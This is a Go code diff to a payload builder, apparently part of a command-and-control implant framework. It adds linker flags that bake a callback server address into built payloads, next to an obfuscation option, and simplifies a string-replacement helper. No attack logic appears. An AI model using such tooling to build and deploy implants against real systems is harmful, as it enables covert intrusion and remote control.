@@ -6,6 +6,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"strings"
 )
 
 // Builder generates payloads for all target platforms.
@@ -180,6 +181,12 @@ func buildPayloadWithConfig(cfg PayloadConfig, outputDir, server string) {
 		env = append(env, "CGO_ENABLED=0")
 	}
 
+	// Embed server address via ldflags if provided
+	if server != "" {
+		ldflags := fmt.Sprintf("-s -w -X main.defaultServer=%s", server)
+		env = append(env, "GOFLAGS=-ldflags="+ldflags)
+	}
+
 	goBin := findGoBinary()
 
 	if cfg.Obfuscate && cfg.GOOS != "ALL" {
@@ -190,11 +197,12 @@ func buildPayloadWithConfig(cfg PayloadConfig, outputDir, server string) {
 		cmd.Stderr = os.Stderr
 		cmd.Run()
 	} else {
-		cmd := exec.Command(goBin, "build",
-			"-ldflags=-s -w",
-			"-o", buildOutput,
-			cfg.Source,
-		)
+		args := []string{"build", "-ldflags=-s -w", "-o", buildOutput}
+		if server != "" {
+			args = []string{"build", fmt.Sprintf("-ldflags=-s -w -X main.defaultServer=%s", server), "-o", buildOutput}
+		}
+		args = append(args, cfg.Source)
+		cmd := exec.Command(goBin, args...)
 		cmd.Env = env
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
@@ -230,33 +238,7 @@ func checkCompiler(cc string) {
 func replaceServer(data []byte, server string) []byte {
 	// Simple string replacement for server address
 	old := "127.0.0.1:8443"
-	return []byte(stringReplace(string(data), old, server))
-}
-
-func stringReplace(s, old, new string) string {
-	if len(old) == 0 {
-		return s
-	}
-	result := ""
-	for {
-		idx := indexOf(s, old)
-		if idx == -1 {
-			result += s
-			break
-		}
-		result += s[:idx] + new
-		s = s[idx+len(old):]
-	}
-	return result
-}
-
-func indexOf(s, substr string) int {
-	for i := 0; i <= len(s)-len(substr); i++ {
-		if s[i:i+len(substr)] == substr {
-			return i
-		}
-	}
-	return -1
+	return []byte(strings.ReplaceAll(string(data), old, server))
 }
 
 func init() {
